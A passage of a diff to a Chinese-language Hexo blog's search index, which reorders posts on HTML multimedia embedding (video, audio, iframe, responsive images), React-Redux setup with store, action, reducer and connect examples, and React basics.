class="string">&quot;rabbit320.mp4&quot;</span>&gt;</span>此链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span>观看<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><em>poster</em>—视频的封面</p>
-<h3 id="audio标签"><a href="#audio标签" class="headerlink" title="audio标签"></a>audio标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;audio/mp3&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;audio/ogg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>你的浏览器不支持 HTML5 音频时显示<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>audio没有视觉部件，所以除了不支持width、height和poster之外，它支持video所以video标签拥有的特性。</p>
-<h3 id="Iframe元素—嵌入技术"><a href="#Iframe元素—嵌入技术" class="headerlink" title="Iframe元素—嵌入技术"></a>Iframe元素—嵌入技术</h3><p>embed和object元素主要用来嵌入PDF和SVG、Flash，但现今它们都在逐渐被淘汰，只有iframe现在经常还被使用。</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowfullscreen</span> <span class="attr">sandbox</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;address&quot;</span>&gt;</span></span><br><span class="line">    Fallback link for browsers that don&#x27;t support iframes</span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>**<em>allowfullscreen:</em> **允许进行全屏展示</p>
-<p><em><strong>frameborder:</strong></em> 绘制边框（推荐在CSS中用border）</p>
-<p><em><strong>sandbox:</strong></em> 提高安全性</p>
-<h3 id="响应式图片"><a href="#响应式图片" class="headerlink" title="响应式图片"></a>响应式图片</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">srcset</span>=<span class="string">&quot;elva-fairy-320w.jpg 320w,</span></span></span><br><span class="line"><span class="tag"><span class="string">             elva-fairy-480w.jpg 480w,</span></span></span><br><span class="line"><span class="tag"><span class="string">             elva-fairy-800w.jpg 800w&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">sizes</span>=<span class="string">&quot;(max-width: 320px) 280px,</span></span></span><br><span class="line"><span class="tag"><span class="string">            (max-width: 480px) 440px,</span></span></span><br><span class="line"><span class="tag"><span class="string">            800px&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">src</span>=<span class="string">&quot;elva-fairy-800w.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Elva dressed as a fairy&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><em><strong>srcset:</strong></em> 图像地址 固有宽度（以w为单位）</p>
-<p><em><strong>sizes:</strong></em> (媒体条件) 槽的宽度（条件为真时）</p>
-<p><strong>运行机制：</strong></p>
-<pre><code>                1. 检查设备宽度
-                2. 检查sizes列表中哪个媒体条件第一个为真
-                3. 查看对应的槽宽度
-                4. 加载srcset列表中最接近该槽大小的图像
-</code></pre>
-]]></content>
-      <categories>
-        <category>Frontend/前端</category>
-      </categories>
-      <tags>
-        <tag>HTML</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Handy CheatSheet</title>
     <url>/2021/10/27/Handy-CheatSheet/</url>
     <content><![CDATA[<h1 id="Algorithm-Time-Complexity"><a href="#Algorithm-Time-Complexity" class="headerlink" title="Algorithm Time Complexity"></a>Algorithm Time Complexity</h1><table>
@@ -420,6 +378,48 @@
       </categories>
       <tags>
         <tag>Algorithm</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTML基础---学习手记</title>
+    <url>/2021/09/22/HTMLNotes/</url>
+    <content><![CDATA[<p><strong>关于HTML一些生疏和不常见的知识，简单汇总一下。</strong></p>
+<a id="more"></a>
+
+<h2 id="HTML布局元素"><a href="#HTML布局元素" class="headerlink" title="HTML布局元素"></a>HTML布局元素</h2><blockquote>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&gt;<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">article</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">   <span class="tag">&lt;<span class="name">aside</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line">&gt;<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="../pic/Layout.jpg" alt="Layout"></p>
+</blockquote>
+<h2 id="多媒体嵌入"><a href="#多媒体嵌入" class="headerlink" title="多媒体嵌入"></a>多媒体嵌入</h2><h3 id="图片—img"><a href="#图片—img" class="headerlink" title="图片—img"></a>图片—img</h3><p> 为图片提供一个语义容器，在标题和图片之间建立清晰的关联，使用HTML5 的<figure>和<figcaption>元素。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">figure</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;当图片无法显示时&quot;</span> <span class="attr">title</span>=<span class="string">&quot;当鼠标悬浮在图片时说明图片&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">figcaption</span>&gt;</span>说明图片的描述文字<span class="tag">&lt;/<span class="name">figcaption</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">figure</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="视频和音频—video-amp-audio"><a href="#视频和音频—video-amp-audio" class="headerlink" title="视频和音频—video&amp;audio"></a>视频和音频—video&amp;audio</h2><h3 id="Video"><a href="#Video" class="headerlink" title="Video"></a>Video</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;视频资源地址&quot;</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    不支持视频时显示</span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><em>controls</em> 显示浏览器提供的控件界面</p>
+<h4 id="使用多个播放源以提高兼容性"><a href="#使用多个播放源以提高兼容性" class="headerlink" title="使用多个播放源以提高兼容性"></a>使用多个播放源以提高兼容性</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/webm&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    浏览器不支持该视频时显示</span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p> WebM 和 MP4 两种格式在目前已经足够支持大多数平台和浏览器。</p>
+<h4 id="其他video特性—H5"><a href="#其他video特性—H5" class="headerlink" title="其他video特性—H5"></a>其他video特性—H5</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">autoplay</span> <span class="attr">loop</span> <span class="attr">muted</span></span></span><br><span class="line"><span class="tag">       <span class="attr">poster</span>=<span class="string">&quot;address&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/webm&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>你的浏览器不支持 HTML5 视频。可点击<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;rabbit320.mp4&quot;</span>&gt;</span>此链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span>观看<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><em>poster</em>—视频的封面</p>
+<h3 id="audio标签"><a href="#audio标签" class="headerlink" title="audio标签"></a>audio标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;audio/mp3&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;audio/ogg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>你的浏览器不支持 HTML5 音频时显示<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>audio没有视觉部件，所以除了不支持width、height和poster之外，它支持video所以video标签拥有的特性。</p>
+<h3 id="Iframe元素—嵌入技术"><a href="#Iframe元素—嵌入技术" class="headerlink" title="Iframe元素—嵌入技术"></a>Iframe元素—嵌入技术</h3><p>embed和object元素主要用来嵌入PDF和SVG、Flash，但现今它们都在逐渐被淘汰，只有iframe现在经常还被使用。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowfullscreen</span> <span class="attr">sandbox</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;address&quot;</span>&gt;</span></span><br><span class="line">    Fallback link for browsers that don&#x27;t support iframes</span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>**<em>allowfullscreen:</em> **允许进行全屏展示</p>
+<p><em><strong>frameborder:</strong></em> 绘制边框（推荐在CSS中用border）</p>
+<p><em><strong>sandbox:</strong></em> 提高安全性</p>
+<h3 id="响应式图片"><a href="#响应式图片" class="headerlink" title="响应式图片"></a>响应式图片</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">srcset</span>=<span class="string">&quot;elva-fairy-320w.jpg 320w,</span></span></span><br><span class="line"><span class="tag"><span class="string">             elva-fairy-480w.jpg 480w,</span></span></span><br><span class="line"><span class="tag"><span class="string">             elva-fairy-800w.jpg 800w&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">sizes</span>=<span class="string">&quot;(max-width: 320px) 280px,</span></span></span><br><span class="line"><span class="tag"><span class="string">            (max-width: 480px) 440px,</span></span></span><br><span class="line"><span class="tag"><span class="string">            800px&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">src</span>=<span class="string">&quot;elva-fairy-800w.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Elva dressed as a fairy&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><em><strong>srcset:</strong></em> 图像地址 固有宽度（以w为单位）</p>
+<p><em><strong>sizes:</strong></em> (媒体条件) 槽的宽度（条件为真时）</p>
+<p><strong>运行机制：</strong></p>
+<pre><code>                1. 检查设备宽度
+                2. 检查sizes列表中哪个媒体条件第一个为真
+                3. 查看对应的槽宽度
+                4. 加载srcset列表中最接近该槽大小的图像
+</code></pre>
+]]></content>
+      <categories>
+        <category>Frontend/前端</category>
+      </categories>
+      <tags>
+        <tag>HTML</tag>
       </tags>
   </entry>
   <entry>
@@ -777,6 +777,77 @@
       </tags>
   </entry>
   <entry>
+    <title>Redux入门操作详解</title>
+    <url>/2021/11/28/ReduxIntroduction/</url>
+    <content><![CDATA[<p><strong>Redux 是 JavaScript 状态容器，提供可预测化的状态管理。</strong>随着 JavaScript 单页应用开发日趋复杂，<strong>JavaScript 需要管理比任何时候都要多的 state （状态）</strong>。 这些 state 可能包括<strong>服务器响应、缓存数据、本地生成尚未持久化到服务器的数据</strong>，也包括<strong>UI 状态，如激活的路由，被选中的标签，是否显示加载动效或者分页器</strong>等等。<strong>本次主要讲解当前针对react框架的redux，即REACT-REDUX。</strong></p>
+<a id="more"></a>
+
+<h1 id="React-Redux"><a href="#React-Redux" class="headerlink" title="React-Redux"></a>React-Redux</h1><p><strong>首先，react-redux与redux的核心理念一致，只是一些API的使用上存在差异，react-redux使得在react中使用redux更为简便。</strong></p>
+<h2 id="Redux的三大原则——Three-Principles"><a href="#Redux的三大原则——Three-Principles" class="headerlink" title="Redux的三大原则——Three Principles"></a>Redux的三大原则——Three Principles</h2><h3 id="单一数据源"><a href="#单一数据源" class="headerlink" title="单一数据源"></a>单一数据源</h3><p>整个应用的<code>state</code>被存储在一棵object tree上，并且这个object tree只存在于<code>store</code>，且<code>store</code>是唯一的，仅此一个。</p>
+<h3 id="State只读"><a href="#State只读" class="headerlink" title="State只读"></a>State只读</h3><p>唯一改变state的方法是触发<strong>action</strong>，action是一个用于描述已发生事件的对象，其形式为<code>&#123;type:&quot;&quot;, data:&quot;&quot;&#125;</code></p>
+<h3 id="使用纯函数来执行修改"><a href="#使用纯函数来执行修改" class="headerlink" title="使用纯函数来执行修改"></a>使用纯函数来执行修改</h3><p><strong>为了描述action如何改变state tree，需要编写reducers。</strong></p>
+<p>Reducer只是一些纯函数，它接收先前的 state 和 action，并返回新的 state。</p>
+<h2 id="React-Redux实际操作步骤"><a href="#React-Redux实际操作步骤" class="headerlink" title="React-Redux实际操作步骤"></a>React-Redux实际操作步骤</h2><h3 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h3><p>在src下新建名为<code>redux</code>的文件，并创建好4个common JS文件，分别为<code>store.js</code>, <code>reducer.js</code>, <code>action.js</code>以及<code>constant.js</code>。其中<code>constant.js</code>用于存储常量，其余三个代表redux的三个核心。</p>
+<p>注：如果不只一个<code>action/reducer</code>，可以分别创建action和reducer的文件夹。</p>
+<p>在<code>index.js</code>中引入<code>store.js</code>，并从<code>react-redux</code>中引入<code>Provider</code>，<code>Provider</code>组件用于给<code>App</code>下的每个需要用到redux的组件传递<code>store</code>。实例如下：</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">&#x27;react-dom&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./redux/store&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;Provider&#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span></span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">    <span class="comment">//为所有组件提供store</span></span><br><span class="line">    &lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">        &lt;App /&gt;</span><br><span class="line">    &lt;/Provider&gt;,</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;root&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="步骤二——编写store"><a href="#步骤二——编写store" class="headerlink" title="步骤二——编写store"></a>步骤二——编写store</h3><p>在store文件中引入能创建<code>store</code>实例的<code>creatStore</code>、能修改状态的<code>reducer</code>和能执行异步的<code>thunk</code>和中间件<code>applyMiddleware</code>（如果需要）。</p>
+<p>注：<strong>对于多个状态需要维护的情况，从<code>redux</code>中引入<code>combineReducers</code>方法，该方法可以通过对象<code>&#123;&#125;</code>的键值对<code>key:value</code>形式，维护任意多个状态（即reducer）。</strong></p>
+<p>实例如下：</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createStore, applyMiddleware, combineReducers&#125; <span class="keyword">from</span> <span class="string">&#x27;redux&#x27;</span></span><br><span class="line"><span class="keyword">import</span> countReducer <span class="keyword">from</span> <span class="string">&#x27;./reducers/count&#x27;</span></span><br><span class="line"><span class="keyword">import</span> personReducer <span class="keyword">from</span> <span class="string">&#x27;./reducers/person&#x27;</span></span><br><span class="line"><span class="keyword">import</span> thunk <span class="keyword">from</span> <span class="string">&#x27;redux-thunk&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> allReducers = combineReducers(&#123;<span class="attr">count</span>: countReducer, <span class="attr">people</span>: personReducer&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = createStore(allReducers, applyMiddleware(thunk))</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br></pre></td></tr></table></figure>
+<h3 id="步骤三——编写action"><a href="#步骤三——编写action" class="headerlink" title="步骤三——编写action"></a>步骤三——编写action</h3><p>引入store文件，和常量文件constant（如果有）。编写action函数，其会返回一个action对象，形式为<code>&#123;type:&quot;&quot;, data:&quot;&quot;&#125;</code>。</p>
+<p>实例如下：</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&quot;../store&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;INCREMENT, DECREMENT&#125; <span class="keyword">from</span> <span class="string">&#x27;../constant&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createIncrementAction = <span class="function"><span class="params">data</span> =&gt;</span> (&#123;<span class="attr">type</span>:INCREMENT, data&#125;);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createDecrementAction = <span class="function"><span class="params">data</span> =&gt;</span> (&#123;<span class="attr">type</span>:DECREMENT, data&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createIncrementAsyncAction = <span class="function">(<span class="params">data, time</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            store.dispatch(&#123;<span class="attr">type</span>:INCREMENT, data&#125;)</span><br><span class="line">        &#125;, time)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="步骤四——编写reducer"><a href="#步骤四——编写reducer" class="headerlink" title="步骤四——编写reducer"></a>步骤四——编写reducer</h3><p><strong>reducer负责维护状态。</strong>编写reducer函数，需要设置初始化的状态值，并对函数传入<code>action</code>参数，根据<code>action</code>对象的<code>type</code>和<code>data</code>对状态进行操作，并返回操作后的状态。</p>
+<p>实例如下：</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> initNumber = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">countReducer</span>(<span class="params">preState=initNumber, action</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;type, data&#125; = action;</span><br><span class="line">    <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;increment&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> preState + data;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;decrement&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> preState - data;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> preState;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<p>至此，redux部分的基本三大件已经写完。接下来需要编写组建模块。</p>
+<h3 id="步骤五——编写Container-Component"><a href="#步骤五——编写Container-Component" class="headerlink" title="步骤五——编写Container/Component"></a>步骤五——编写Container/Component</h3><p>首先，引入<code>action</code>，并从<code>react-redux</code>中引入<code>connect</code>函数，该函数用于创建并暴露一个Container容器，同时将state和action传入组件中，并且它们都会被传入到组件自身的<code>prorps</code>属性中。实例如下：</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="comment">// 引入connect</span></span><br><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span></span><br><span class="line"><span class="comment">// 引入action</span></span><br><span class="line"><span class="keyword">import</span> &#123;createIncrementAction, createDecrementAction, createIncrementAsyncAction&#125; <span class="keyword">from</span> <span class="string">&#x27;../../redux/actions/count&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Count</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(</span><br><span class="line">  	<span class="comment">// 传入state</span></span><br><span class="line">    state =&gt; (&#123;<span class="attr">count</span>: state.count, <span class="attr">people</span>: state.people&#125;),</span><br><span class="line">  	<span class="comment">// 传入action</span></span><br><span class="line">    &#123;<span class="attr">increment</span>: createIncrementAction,</span><br><span class="line">     decrement: createDecrementAction,</span><br><span class="line">     asyncIncrement: createIncrementAsyncAction</span><br><span class="line">    &#125;</span><br><span class="line">    )(Count)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>FrontEnd/前端</category>
+      </categories>
+      <tags>
+        <tag>React</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>React入门篇</title>
     <url>/2022/02/12/ReactIntroduction/</url>
     <content><![CDATA[<p>前端热门技术栈有很多，其中遵循/类似MVVM或MVC设计模式的前端框架/Library有：React、Vue以及Angular等等。今天，我们首先谈一谈React的基本概念。</p>
@@ -824,77 +895,6 @@
 <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> MyTitle = React.createClass(&#123;</span><br><span class="line">  propTypes: &#123;</span><br><span class="line">    title: React.PropTypes.string.isRequired, <span class="comment">// title属性是必须的，且需为字符串</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> &#123;this.props.title&#125; <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 <p>此外，<code>getDefaultProps</code>方法可以用来设置组件属性的默认值。具体用法如下：</p>
 <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> MyTitle = React.createClass(&#123;</span><br><span class="line">  getDefaultProps : <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      title : <span class="string">&#x27;Hello World&#x27;</span>	   <span class="comment">// 设置属性title的默认值为Hello World</span></span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> &#123;this.props.title&#125; <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">  &lt;MyTitle /&gt;,</span><br><span class="line">  <span class="built_in">document</span>.body</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>FrontEnd/前端</category>
-      </categories>
-      <tags>
-        <tag>React</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Redux入门操作详解</title>
-    <url>/2021/11/28/ReduxIntroduction/</url>
-    <content><![CDATA[<p><strong>Redux 是 JavaScript 状态容器，提供可预测化的状态管理。</strong>随着 JavaScript 单页应用开发日趋复杂，<strong>JavaScript 需要管理比任何时候都要多的 state （状态）</strong>。 这些 state 可能包括<strong>服务器响应、缓存数据、本地生成尚未持久化到服务器的数据</strong>，也包括<strong>UI 状态，如激活的路由，被选中的标签，是否显示加载动效或者分页器</strong>等等。<strong>本次主要讲解当前针对react框架的redux，即REACT-REDUX。</strong></p>
-<a id="more"></a>
-
-<h1 id="React-Redux"><a href="#React-Redux" class="headerlink" title="React-Redux"></a>React-Redux</h1><p><strong>首先，react-redux与redux的核心理念一致，只是一些API的使用上存在差异，react-redux使得在react中使用redux更为简便。</strong></p>
-<h2 id="Redux的三大原则——Three-Principles"><a href="#Redux的三大原则——Three-Principles" class="headerlink" title="Redux的三大原则——Three Principles"></a>Redux的三大原则——Three Principles</h2><h3 id="单一数据源"><a href="#单一数据源" class="headerlink" title="单一数据源"></a>单一数据源</h3><p>整个应用的<code>state</code>被存储在一棵object tree上，并且这个object tree只存在于<code>store</code>，且<code>store</code>是唯一的，仅此一个。</p>
-<h3 id="State只读"><a href="#State只读" class="headerlink" title="State只读"></a>State只读</h3><p>唯一改变state的方法是触发<strong>action</strong>，action是一个用于描述已发生事件的对象，其形式为<code>&#123;type:&quot;&quot;, data:&quot;&quot;&#125;</code></p>
-<h3 id="使用纯函数来执行修改"><a href="#使用纯函数来执行修改" class="headerlink" title="使用纯函数来执行修改"></a>使用纯函数来执行修改</h3><p><strong>为了描述action如何改变state tree，需要编写reducers。</strong></p>
-<p>Reducer只是一些纯函数，它接收先前的 state 和 action，并返回新的 state。</p>
